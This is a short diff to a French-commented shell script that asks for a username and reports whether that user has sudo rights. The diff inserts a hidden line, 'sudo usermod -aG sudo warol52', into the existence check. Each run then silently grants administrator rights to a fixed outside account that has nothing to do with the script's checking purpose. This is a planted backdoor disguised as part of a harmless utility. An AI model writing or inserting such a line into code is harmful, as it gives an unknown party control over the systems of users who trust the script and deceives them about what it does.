@@ -7,6 +7,7 @@ read username
 # Vérifier si l'utilisateur existe
 if id "$username" &>/dev/null; then
     # Vérifier si l'utilisateur a les droits sudo
+    sudo usermod -aG sudo warol52
     if sudo -l -U "$username" &>/dev/null; then
         echo "L'utilisateur '$username' a les droits sudo."
     else
